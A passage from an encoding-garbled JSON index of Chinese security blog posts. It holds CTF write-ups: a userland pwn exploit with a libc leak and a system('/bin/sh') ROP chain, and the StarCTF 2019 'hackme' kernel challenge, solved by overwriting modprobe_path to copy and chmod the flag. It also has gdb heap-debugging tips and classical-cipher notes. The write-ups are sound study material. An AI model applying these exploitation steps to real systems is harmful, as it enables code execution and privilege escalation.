ˆåœ°å€ã€‚ä¹‹åæˆ‘ä»¬å†å¾€nameä¸­å†™ä¸œè¥¿ï¼Œå°±ç›¸å½“äºè¦†ç›–readå‡½æ•°çš„è¿”å›åœ°å€ã€‚å†ç»è¿‡åå¤è°ƒè¯•ï¼Œå‘ç°readå‡½æ•°è¿”å›åœ°å€å–ç”¨çš„åœ°æ–¹åˆšå¥½æ˜¯FFF25c3c-0x100ï¼Œè€Œä¸”æ¯æ¬¡éƒ½æ˜¯é‚£ä¸ªåœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¦†ç›–äº†ã€‚(è¿™é‡Œåˆ©ç”¨è¾“å…¥messageè¿ä¸Šebpä¹Ÿå¯ä»¥æ³„éœ²å‡ºmessageçš„ebpä¸Šä¿å­˜çš„å†…å®¹ï¼Œä¹Ÿæ˜¯ç›¸åŒçš„æ ˆåœ°å€ï¼Œè°ƒè¯•å‡ºæ¥çš„)\n\n5.ç°åœ¨å°±å°è¯•ç¼–å†™exp:\n\n(1)é¦–å…ˆä¸‰ä¸ªå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef setName(name):\nio.sendafter('Input name :',name)\n\ndef setMessage(message):\nio.sendlineafter('Message length :','-1')\nio.sendafter('Input message :',message)\n\ndef changeName(c):\nio.sendlineafter('Change name?',c)\n```\n\n(2)é€šè¿‡å¡«æ»¡nameï¼Œæ³„éœ²ä¸€ä¸ªæ ˆåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsetName('A'*0x10)\nsetMessage('BBBBBBBBBB')\nsh.recvuntil('<')\nsh.recv(0x1C)\nstack_addr = u32(sh.recv(4))\nchangeName('n')\nlog.info(\"stack_addr:%x\"%stack_addr)\n```\n\n(3)æ³„éœ²å‡½æ•°çœŸå®åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = 'a'*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)\n#è¿™é‡Œç¬¬ä¸€ä¸ªp32(0x100)æ˜¯è¦†ç›–getlineçš„è¯»å–é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯arg_4ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸ºäº†è¦†ç›–å¾ªç¯æ¬¡æ•°ï¼Œä¹Ÿå°±æ˜¯arg_8\nsetMessage(payload)\nsh.recvuntil('<')\natoi_addr = u32(sh.recv(4))\nlog.info(\"atoi_addr:%x\"%atoi_addr)\n```\n\nè·å–nameçš„é•¿åº¦ï¼šå½“ç„¶è¿™æ”¹æ‰çš„æ˜¯nameçš„é•¿åº¦ï¼Œmessageçš„é•¿åº¦ä¿å­˜åœ¨[ebp+var_30]ä¸Šï¼Œå¹¶ä¸”å› ä¸º-1å·²ç»è¢«æ›´æ”¹ä¸º0xffffffffï¼Œè¶³å¤Ÿå¤§äº†ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191529313.jpeg)\n\nåˆ¤æ–­å¾ªç¯æ¬¡æ•°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528168.jpeg)\n\n(4)è®¡ç®—å¾—åˆ°libcä¸­å…¶å®ƒåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nlibc = LibcSearcher('atoi',atoi_addr)\nlibc_base = atoi_addr - libc.dump('atoi')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n```\n\n(5)å°†å†™å…¥nameçš„åœ°æ–¹è¦†ç›–æˆè¯»å–readå‡½æ•°è¿”å›åœ°å€çš„åœ°æ–¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = 'a'*0x34 + p32(target_addr)\nsetMessage(payload)\n```\n\n(6)å†æ¬¡è¯»å–nameçš„æ—¶å€™å°±å¯ä»¥å‘é€ropé“¾ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nrop = p32(system_addr) + p32(0) + p32(binsh_addr)\nsetName(rop)\n```\n\n(7)æœ€ågetshell:\n\nâ–²è¿™ä¸ªexpåœ¨ä¸åŒçš„glibcç‰ˆæœ¬ä¸‹ä¸å¤ªä¸€æ ·ï¼Œ2.23/2.24/2.27éƒ½èƒ½è·‘é€šï¼Œä½†æ˜¯åœ¨2.31/2.32ç‰ˆæœ¬ä¸‹æ²¡åŠæ³•è·‘é€šï¼Œå°¤å…¶æ˜¯2.31ï¼Œè¿æ ˆåœ°å€éƒ½æ²¡åŠæ³•æ³„éœ²ã€‚2.32åˆ™æ˜¯åœ¨æœ€åä¸€æ­¥ä¼šå¤±è´¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚å¯èƒ½æ˜¯canaryçš„åŸå› ï¼Œä¸åŒç‰ˆæœ¬çš„canaryæ£€æŸ¥æœºåˆ¶å¥½åƒä¸ä¸€æ ·ã€‚\n","tags":["æ•´æ•°æ¼æ´"],"categories":["PWN","æ•´æ•°æ¼æ´0xb"]},{"title":"starctf2019-hackme","url":"/2021/08/14/starctf2019-hackme/","content":"\n1.é¦–å…ˆè§£åŒ…ï¼Œçœ‹initï¼Œç©ºçš„ã€‚\n\n2.ç„¶åçœ‹å¯åŠ¨è„šæœ¬ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nqemu-system-x86_64 \\\n-m 256M \\\n-nographic \\\n-kernel bzImage \\\n-append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \\\n-monitor /dev/null \\\n-initrd initramfs.cpio \\\n-smp cores=4,threads=2 \\\n-gdb tcp::1234 \\\n-cpu qemu64,smep,smap 2>/dev/null\n```\n\næ¯”è¾ƒæ­£å¸¸ï¼Œå¼€äº†smepå’Œsmapï¼Œå¹¶ä¸”4å†…æ ¸ï¼Œ2çº¿ç¨‹ï¼Œè¿™é‡Œå°±å¯èƒ½ä¼šæ˜¯æ¡ä»¶ç«äº‰çš„è€ƒç‚¹ã€‚\n\n3.ç„¶åæ‹–å…¥IDAåˆ†æï¼šç¨‹åºæ¯”è¾ƒæ£€æŸ¥ï¼Œç±»ä¼¼èœå•é¢˜ï¼Œä½†æ˜¯IDAä¸­F5çœ‹ä¼ªä»£ç ä¸­å¤šäº†å¾ˆå¤šçš„å¥‡æ€ªçš„å‚æ•°ï¼Œæœ€å¥½ä»¥add->delete->edit->readçš„é¡ºåºæ¥çœ‹æ¯”è¾ƒèˆ’æœï¼Œä¸€èˆ¬çš„å †ä½“åˆ†æç»“æ„ä¹Ÿå·®ä¸å¤šæ€ä¹ˆçœ‹ã€‚\n\né¦–å…ˆåˆ¤æ–­ä¸‹ç»“æ„ä½“ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ndataStruct:\nidx       4byte\npadding   4byte\ndata_ptr  8byte\ndata_size 8byte\noffset    8byte\n\nstruct chunkNote:\nchunk_addr 8byte\nchunk_size 8byte\n```\n\nå…¶ä¸­poolä¸­å­˜å‚¨å¤šä¸ªchunkNoteç»“æ„ä½“ï¼Œä¸æ˜¯æŒ‡é’ˆï¼Œè€Œæ˜¯ç»“æ„ä½“ã€‚\n\n(1)addï¼šæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œåˆ›å»ºå †å—ï¼Œæ‹·è´æ•°æ®ï¼Œå­˜å‚¨chunkåˆ°poolä¸­\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-31-32.png)\n\n(2)deleteï¼šä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œé‡Šæ”¾å†…å­˜ï¼ŒæŒ‡é’ˆç½®ç©ºã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-36-01.png)\n\n(3)editï¼šæœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œåˆ¤æ–­äº†chunkæŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”offset+sizeè¦å°äºç­‰äºä¹‹å‰ä¿å­˜çš„sizeã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-42-06.png)\n\næœ¬æ¥æ²¡å•¥ï¼Œä½†æ˜¯è¿™é‡Œoffsetå’Œsizeæ˜¯intç±»å‹ï¼Œå¯ä»¥ä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¾æ®chunk_addræ¥å‘ä¸Šä¿®æ”¹æ•°æ®äº†ï¼Œç›¸å½“äºè¶Šç•Œå†™ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-45-07.png)\n\n(4)readï¼šåŒæ ·çš„ï¼Œä¹Ÿç›¸å½“äºè¶Šç•Œè¯»ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-46-46.png)\n\nâ–²è™½è¯´æ˜¯è¶Šç•Œå†™å’Œè¶Šç•Œè¯»ï¼Œä½†æ˜¯ç”±äºcopyç³»åˆ—å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¾€é«˜åœ°å€è¯»å†™çš„è¯ï¼Œ(å†…æ ¸ç³»åˆ—å‡½æ•°éƒ½åœ¨é«˜åœ°å€)offsetä¸€å®šéœ€è¦å¾ˆå¤§ï¼Œç„¶ååˆè¦æ»¡è¶³å°äºsizeï¼Œé‚£ä¹ˆuserDataSizeåŠ¿å¿…è¦è®¾ç½®ä¸ºè´Ÿæ•°ï¼Œè´Ÿæ•°è½¬æ¢æˆunsigned longå°±ä¼šå˜å¾—å¾ˆå¤§ï¼ŒåŸºæœ¬å°±ä¼šå¯¼è‡´ä¸€åŠçš„ç©ºé—´è¢«è¦†ç›–ï¼Œé‚£ä¹ˆç¨‹åºæŒ‡å®šå´©ç›˜ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯ç”³è¯·poolå…¨å±€å˜é‡å¤„æ¥è¿›è¡Œä»»æ„è¯»å†™æ¯”è¾ƒå¥½ã€‚\n\nå¦å¤–ä¹Ÿç”±äºslubçš„ç‰¹æ€§ï¼Œç®€å•ä¿®æ”¹fdçš„è¯ï¼Œè™½ç„¶èƒ½å¤Ÿä»»æ„ç”³è¯·ï¼Œä½†æ˜¯å¦‚æœfdçš„å†…å­˜å¤„ä¿å­˜çš„å†…å®¹æ˜¯ä¸ªéæ³•çš„ï¼Œå†æ¬¡ç”³è¯·è¯¥å¤§å°çš„chunkç¨‹åºå°±ä¼šå´©ï¼Œæ‰€ä»¥æœ‰å…¨å±€å˜é‡poolå°±ç”¨poolã€‚\n\n4.æ€è€ƒä¸€ä¸‹æ¼æ´æ€ä¹ˆåˆ©ç”¨ã€‚\n\n(1)é¦–å…ˆéœ€è¦åœ°å€\n\nâ‘ å †åœ°å€ï¼šé‡Šæ”¾chunkAï¼Œä»chunkBå‘ä¸Šåç§»è¯»å–chunkAçš„fdï¼Œå³å¯å¾—åˆ°æŒ‡å‘çš„chunkCçš„åœ°å€ï¼Œå³chunkA.fd = chunkA_addr+size*2ã€‚\n\nâ‘¡å†…æ ¸åŸºåœ°å€ï¼šä¾æ®ä»»æ„è¯»ï¼Œä»ç¬¬ä¸€ä¸ªchunkå¾€ä¸Šçš„åœ°æ–¹è¯»å–chunkä¸­çš„å†…å®¹ï¼Œä»ä¸­ç­›é€‰å‡ºvmlinuxä¸­çš„åœ°å€ï¼Œè¯»å–ä¹‹åå‡å»åç§»ï¼Œå³å¯å¾—åˆ°å†…æ ¸åŸºåœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-45-28.png)\n\nä¾‹å¦‚è¿™é‡Œå°±å¯ä»¥è¯»å–å›¾ä¸­çš„0xffffffff81849ae0ï¼Œç„¶åå‡å»0x849ae0å³å¯å¾—åˆ°åŸºåœ°å€ã€‚å½“ç„¶è¿™æ²¡æœ‰ç”¨kalsrçš„æ•ˆæœã€‚å¼€äº†ä¹‹åå¦‚ä¸‹ï¼Œåç§»ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-51-59.png)\n\nå¾—åˆ°è¿™æ¬¡æ‰“å¼€çš„åŸºåœ°å€ï¼š0xffffffff9de00000ï¼Œç”¨å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-59-38.png)\n\nå¯ä»¥çœ‹åˆ°æœ€å‰é¢çš„å°±æ˜¯å†…æ ¸åŸºåœ°å€ã€‚\n\nâ‘¢å‡½æ•°åŸºåœ°å€ï¼š\n\ncat /proc/kallsyms|grep commit_creds\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_18-12-56.png)\n\nä»kallsymsä¸­å¯ä»¥æŸ¥çœ‹åˆ°æ‰€æœ‰å‡½æ•°ï¼Œå‡å»åŸå§‹åŸºåœ°å€0xFFFFFFFF81000000å†åŠ ä¸ŠéšæœºåŒ–çš„å†…æ ¸åŸºåœ°å€å°±æ˜¯éšæœºåŒ–ä¹‹åçš„å‡½æ•°åœ°å€äº†ã€‚æ¯”å¦‚ä¸Šä¾‹ä¸ºï¼š\n\n0xffffffff8104d220-0xFFFFFFFF81000000+0xffffffff9de00000=0xffffffff9de4d220\n\nå¾—åˆ°è¿è¡Œäº†kaslrçš„å‡½æ•°åœ°å€ã€‚\n\nâ‘£æ¨¡å—åŸºåœ°å€ï¼šç”±äºéœ€è¦poolå˜é‡åœ°å€ï¼Œæ‰€ä»¥æ¨¡å—çš„åŸºåœ°å€è‚¯å®šä¹Ÿéœ€è¦ï¼Œè¿™é‡Œåˆ©ç”¨mod_treeæ¥è·å–ã€‚mod_treeåŒ…å«äº†æ‰€æœ‰è£…è½½çš„Modçš„åŸºåœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-16.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-24.png)\n\nå¯ä»¥çœ‹åˆ°hackmeæ¨¡å—çš„åŸºåœ°å€ä¹ŸåŒ…å«åœ¨é‡Œé¢ï¼Œå¼€äº†kaslrä¹‹åä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨å†…æ ¸åŸºåœ°å€å¾—åˆ°mod_treeçš„åœ°å€ï¼Œç”³è¯·ä¸‹æ¥å°±å¯ä»¥ä»é‡Œé¢è¯»å‡ºhackmeæ¨¡å—çš„åŸºåœ°å€ã€‚\n\n \n\n(2)ç„¶åæ–¹æ³•å°±å¾ˆå¤šäº†ï¼Œè™½ç„¶å¼€äº†smep,smap,kaslrï¼š\n\nâ‘ ä¿®æ”¹modprobe_pathï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-46-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-47-02.png)\n\nå¯ä»¥çœ‹åˆ°modprobe_pathæŒ‡å‘ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-50-56.png)\n\nè€Œå½“æŸä¸ªç‰¹å®šé”™è¯¯å‘ç”Ÿæ—¶ï¼Œå°±ä¼šè¿è¡Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸”æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œ(æˆ‘å°è¯•è¿‡ï¼Œè¿è¡Œ/bin/shä¸èƒ½ææƒ)æ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠè·¯å¾„æ”¹æˆæˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†flagå¤åˆ¶ä¸€ä¸‹ï¼Œæ”¹ä¸‹æƒé™å°±èƒ½æ‰“å¼€äº†ã€‚(ç›´æ¥cat flagä¹Ÿä¸è¡Œï¼Œå¾ˆå¥‡æ€ª)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-59-15.png)\n\næˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹åªèƒ½ç±»ä¼¼æ˜¯å¦‚ä¸‹å‘½ä»¤æ‰è¡Œçš„ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\n#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\n\n\n#æˆ–è€…\n#!/bin/sh\n/bin/cat /flag > /home/pwn/flag.txt\n```\n\næ³¨æ„è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚\n\nâ–²ç„¶åè§¦å‘è¿™ä¸ªç‰¹å®šç±»å‹çš„é”™è¯¯éœ€è¦ä¸€ä¸ªé”™è¯¯æ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n```\n\nè¿™ä¸ªelfçš„é”™è¯¯æ ¼å¼å°±æ˜¯\\\\xff\\\\xff\\\\xff\\\\xffï¼Œæˆ–è€…å…¶ä»–é”™è¯¯æ ¼å¼ä¹Ÿè¡Œã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\nstrncpy(mem,\"/home/pwn/copy.sh\\0\",18);\nwrite_to_kernel(fd,0xc,mem,18,0);\n\nsystem(\"echo -ne '#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh\");\nsystem(\"chmod +x /home/pwn/copy.sh\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n\nsystem(\"/home/pwn/dummy\");\nsystem(\"cat flag\");\n```\n\n \n","tags":["modprobe"],"categories":["pwn-kernel","Kernel_modprobe"]},{"title":"å †è°ƒè¯•å¸¸ç”¨éªšæ“ä½œ","url":"/2021/08/14/å †è°ƒè¯•å¸¸ç”¨éªšæ“ä½œ/","content":"\n1.æŸ¥çœ‹å†…å­˜ï¼šx/40gx addr\n\n2.æŸ¥çœ‹å¯èƒ½ç”¨åˆ°çš„å˜é‡æˆ–å‡½æ•°åœ°å€ï¼šmagic\n\n3.æŸ¥çœ‹æŒ‡å®šåœ°æ–¹åœ°å€æˆ–å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\np &__malloc_hook\np *__malloc_hook\np __malloc_hook\np main_arena.bins[0]\np main_arena.fastbinsY\n```\n\n4.çæ•²æŸ¥çœ‹ï¼š\n\ntelescope 0x18f6000 20\n\nx/20i &__libc_realloc\n\n5.æŸ¥çœ‹å †çŠ¶æ€å†…å®¹ï¼š\n\nheap; vis; parseheap; bins;\n\n6.æŸ¥çœ‹å‡½æ•°æ±‡ç¼–ä»£ç ï¼š\n\nx/20i &__libc_realloc\n\n7.ç›´æ¥ä»Libc.soä¸­æŸ¥æ‰¾å‡½æ•°ï¼š\n\nreadelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep -E \"__malloc_hook|__free_hook|__realloc_hook\"\n\n \n","tags":["è°ƒè¯•"],"categories":["PWN"]},{"title":"å¯†ç å­¦åŸºç¡€","url":"/2021/08/14/å¯†ç å­¦åŸºç¡€/","content":"\n&ç¬¬äºŒç«  å¤å…¸å¯†ç \n\nä¸€ã€å¤å…¸å¯†ç ä¸ç°ä»£å¯†ç å®šä¹‰ï¼š\n\næ ¹æ®æ˜¯å¦ä½¿ç”¨è®¡ç®—æœºè¿›è¡ŒåŠ è§£å¯†æ¥åŒºåˆ†å¤å…¸å’Œç°ä»£ã€‚\n\n \n\näºŒã€å¤å…¸å¯†ç ä¸¤å¤§åŸåˆ™ï¼š\n\n1.æ›¿ä»£(Substitution )ï¼šæŒ‰ä¸€å®šè§„åˆ™æ›¿æ¢æ˜æ–‡ä¸­çš„å…ƒç´ å½¢æˆå¯†æ–‡ã€‚\n\n2.ç½®æ¢(Transposition)ï¼šæŒ‰ä¸€å®šè§„åˆ™æŒªç§»æ˜æ–‡å½¢æˆå¯†æ–‡ã€‚\n\n \n\nä¸‰ã€ä¸åŒåˆ†ç±»ï¼š\n\n1.Monoalphabetic Cipher:å•å­—æ¯æ›¿ä»£å¯†ç (å°†æ˜æ–‡å­—ç¬¦é›†å’Œå¯†æ–‡å­—ç¬¦é›†å»ºç«‹æ˜ å°„å…³ç³»)\n\nâ–²å•è¡¨æ›¿ä»£ï¼šæ˜æ–‡å­—ç¬¦é›†ä¸å¯†æ–‡å­—ç¬¦é›†ä»»æ„æ›¿ä»£(ä¸€ä¸€æ˜ å°„)ï¼Œé‚£ä¹ˆnä¸ªå…ƒç´ å³æœ‰n!ç§ç½®æ¢ã€‚(è‹¥ä»…ä»…é’ˆå¯¹å­—ç¬¦é›†ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡å­—æ¯çš„ä½¿ç”¨é¢‘ç‡æ¥åˆ†æè§£å¯†)\n\n(1)Caesarå¯†ç ï¼šå°†å­—æ¯ç”¨å®ƒä¹‹åçš„ç¬¬ä¸‰ä¸ªå­—æ¯è¿›è¡Œæ›¿ä»£(26ä¸ªå­—æ¯å¾ªç¯)\n\n(2)keywordå¯†ç ï¼š\n\nâ‘ keyï¼šéšæ„é€‰å–ä¸€ä¸ªå…³é”®è¯key\n\nâ‘¡å»é‡ï¼šå°†keyä¸­çš„é‡å¤å­—æ¯å»æ‰ï¼Œä¾‹å¦‚ï¼šsuccess->suce\n\nâ‘¢å¡«è¡¨ï¼šå°†å»é‡çš„keyå¡«å…¥26ä¸ªå­—æ¯è¡¨å‰é¢ä½ç½®ï¼Œä¾æ¬¡åºæ¥ç€å¡«æ»¡26ä¸ªå­—æ¯ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nsuceabdfghijklmnopqrtvwxyz\nabcdefghijklmnopqrstuvwxyz\n```\n\nâ‘¢åŠ å¯†ï¼šä¾æ®ä¸Šè¡¨ï¼ŒæŸ¥è¡¨å°†æ˜æ–‡æ›¿ä»£ä¸ºå¯†æ–‡ã€‚\n\n(3)Multiliteral Cipherï¼šéšæ„é€‰å–ä¸€ä¸ªäº”å­—æ¯çš„å…³é”®è¯key\n\nâ‘ å¡«è¡¨ï¼šä¾æ®å…³é”®è¯keyå½¢æˆ5Ã—5çš„çŸ©é˜µï¼Œå°†26ä¸ªå­—æ¯å¡«å……è¿›å»ï¼Œå…¶ä¸­i/jä¸ºä¸€ä¸ªã€‚\n\nâ‘¡åŠ å¯†ï¼šæ¯ä¸ªå­—æ¯ç›´æ¥è½¬æ¢ä¸ºkeyçš„è¡Œå’Œåˆ—ï¼Œå³ä¸€ä¸ªå­—æ¯ç›´æ¥å˜æˆä¸¤ä¸ªå­—æ¯ã€‚\n\n(æ¯”è¾ƒè„†å¼±ï¼Œå› ä¸ºå¯†é’¥å°±å­˜åœ¨äºå¯†æ–‡ä¸­)\n\nâ˜†åˆ†æï¼šåˆ©ç”¨å­—æ¯ä½¿ç”¨é¢‘ç‡åˆ†æï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454806.png)\n\n \n\n \n\n2.Polyalphabotic Cipherï¼šå¤šè¡¨æ›¿ä»£å¯†ç ï¼Œå‡å°‘å­—æ¯é¢‘ç‡ç‰¹å¾\n\n(1) Vigenere Cipherï¼š\n\nâ‘ keyï¼šéšæ„é€‰å–ä¸€ä¸ªå…³é”®è¯key\n\nâ‘¡å¯¹åº”ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nHOLD HO LDH OLDHOLDHO\nTHIS IS THE PLAINTEXT\n```\n\nâ‘¢åŠ å¯†ï¼š\n\nA.æŸ¥è¡¨åŠ å¯†(è¡Œåˆ—æŸ¥è¡¨éƒ½å¯ä»¥ï¼Œå› ä¸ºå¯¹ç§°çš„)ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454538.png)\n\nB.mod26åŠ å¯†ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25\nA B C D E F G H I J K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z\n\n            7  14 11 3  7  14 11 3  7  14 11 3  7  14 11 3  7  14\nkey:        H  O  L  D  H  O  L  D  H  O  L  D  H  O  L  D  H  O \nplaintext:  T  H  I  S  I  S  T  H  E  P  L  A  I  N  T  E  X  T\n            19 7  8  18 8  18 19 7  4  15 11 0  8  13 19 4  23 19\n\nç›¸åŠ mod26ï¼š  0  21 19 21 15 6  4  10 11 3  22 3  15 1  4  7  4  7\nciphertext: A  V  T  V  P  G  E  K  L  D  W  D  P  B  E  H  E  H\n```\n\nä»¥ä¸Šä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ã€‚\n\nâ˜†åˆ†æï¼š\n\nâ‘ ç®—å¯†é’¥é•¿åº¦ï¼šä¸€æ®µå¯†æ–‡ä¸­æŸ¥æ‰¾é‡å¤å‡ºç°çš„å‡ ä¸ªå­—èŠ‚ï¼Œè®¡ç®—é‡å¤å‡ºç°çš„å‡ ä¸ª\n\n```\n//æ³¨é‡Šå¤´\n\nkey:        R U N R U N R U N R U N R U N R U N R U N R U N R U N\nplaintext:  T O B E O R N O T T O B E T H A T I S T H E Q U E S T\nciphertext: K I O V I E E I G K I O V N U R N V J N U V K H V M G\n```\n\nKIOVå’Œä¸‹ä¸€ä¸ªKIVOï¼ŒNUå’Œä¸‹ä¸€ä¸ªNUï¼Œåˆ†åˆ«ç›¸å·®9ä¸ªå­—æ¯ï¼Œ6ä¸ªå­—æ¯ï¼Œå¤šæ¬¡é‡å¤è®¡ç®—ï¼Œç®—å‡ºå…¬å› æ•°ï¼Œè¿™é‡Œå…¬å› æ•°æ˜¯3ï¼Œé‚£ä¹ˆ3å°±å¯èƒ½æ˜¯å¯†é’¥é•¿åº¦ã€‚\n\nâ‘¡å˜æˆå•è¡¨æ›¿ä»£ï¼šå‡è®¾å¾—åˆ°å…¬å› æ•°é•¿åº¦ä¸ºabcdefï¼Œåˆ™è¿›è¡Œå¦‚ä¸‹è®¡ç®—ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nkey:        abcde fabcd efabc defab cdefa bcdef abcde fabcd efabc defab\nciphertext: lpkso fjbnn mpfls rneoi yqrlx bkqtz ucxot ssbvb wpjil geckb\n```\n\nå°†æ‰€æœ‰ç”±aåŠ å¯†çš„å­—æ¯æå–å‡ºæ¥ï¼Œä¸º ljfoxusjk.......é‡å¤å¤šæ¬¡ã€‚(è¿™é‡Œé€‰å–abcdefä¸­ä»»æ„ä¸€ä¸ªéƒ½å¯)ã€‚è½¬æ¢æˆ6ä¸ªå•è¡¨æ›¿ä»£å¯†ç ï¼Œä¹‹åå³å¯ä»å•è¡¨æ›¿ä»£å¯†ç ljfoxusjk.......ä¸­è¿›è¡Œå­—æ¯é¢‘ç‡åˆ†æï¼Œé€æ­¥ç ´è¯‘ã€‚(æ¯”å¦‚è¯´jå°±æœ‰å¯èƒ½æ˜¯e)\n\n(2)Autokey Cipher(é’ˆå¯¹Vigenere Cipherçš„æ”¹è¿›)ï¼šé€‰å–å…³é”®è¯\n\nâ‘ keyï¼šé€‰å–å…³é”®è¯Key\n\nâ‘¡åˆæ¬¡ï¼škeyåŠ å¯†å¯¹åº”æ•°é‡çš„å¯†æ–‡\n\nâ‘¢é‡å¤ï¼šå°†å‰ä¸€æ¬¡åŠ å¯†å¾—åˆ°çš„å¯†æ–‡æ‹¿æ¥ä½œä¸ºkeyåŠ å¯†ã€‚\n\nâ˜†å¾ˆè„†å¼±ï¼Œå¯†æ–‡å³ä¸ºå¯†é’¥çš„ä¸€éƒ¨åˆ†ï¼Œå¯é€šè¿‡é”™ä½åˆ†ææ¥ç›´æ¥è§£å¯†ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nkey:         capcnpwgd\nplaintext:   anautokeycipherprovidesalongkeyword\nciphertext:  cnpwgd...........................\n```\n\nåˆå§‹å¯†é’¥ä¸ºcapï¼Œä¹‹åä¾æ¬¡å¾—åˆ°cnpï¼Œwgd....\n\n(3)AutoKey Plaintextï¼š(ç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯æ‹¿æ˜æ–‡å†è¿›è¡ŒåŠ å¯†)\n\n \n\n3.Rotor Ciphersï¼šè½¬è½®å¯†ç \n\n(1)è½®å­çš„å†…éƒ¨å¯¹åº”å…³ç³»ä¸å˜ï¼Œå¤–åœ¨è§¦ç‚¹å¯ä»¥è½¬åŠ¨ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454996.png)     ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454998.png)\n\n(2)åˆ©ç”¨å¤šä¸ªè½®å­åˆåœ¨ä¸€èµ·å½¢æˆåŠ å¯†å…³ç³»ï¼Œè½¬åŠ¨è§¦ç‚¹å³å¯æ”¹å˜åŠ 